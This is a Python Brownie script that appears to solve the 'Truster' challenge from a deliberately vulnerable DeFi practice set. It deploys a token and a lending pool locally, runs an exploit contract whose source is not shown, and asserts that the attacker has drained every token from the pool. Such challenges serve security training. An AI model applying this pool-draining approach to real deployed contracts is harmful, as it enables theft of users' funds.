from brownie import DamnValuableToken, TrusterLenderPool, truster_Exploit, accounts
TOKENS_IN_POOL = 1000000


def deploy():

    deployer, attacker = accounts[:2]

    token = DamnValuableToken.deploy({'from': deployer})

    pool = TrusterLenderPool.deploy(token, {'from': deployer})
    token.transfer(pool, TOKENS_IN_POOL)

    assert token.balanceOf(pool) == TOKENS_IN_POOL
    assert token.balanceOf(attacker) == 0

    return deployer, attacker, pool, token


def exploit(token, pool, attacker):
    exploit = truster_Exploit.deploy(token, pool, {'from': attacker})
    exploit.exploit({'from': attacker})


def after(token, pool, attacker):
    assert token.balanceOf(pool) == 0
    assert token.balanceOf(attacker) == TOKENS_IN_POOL


def main():
    deployer, attacker, pool, token = deploy()

    exploit(token, pool, attacker)

    after(token, pool, attacker)
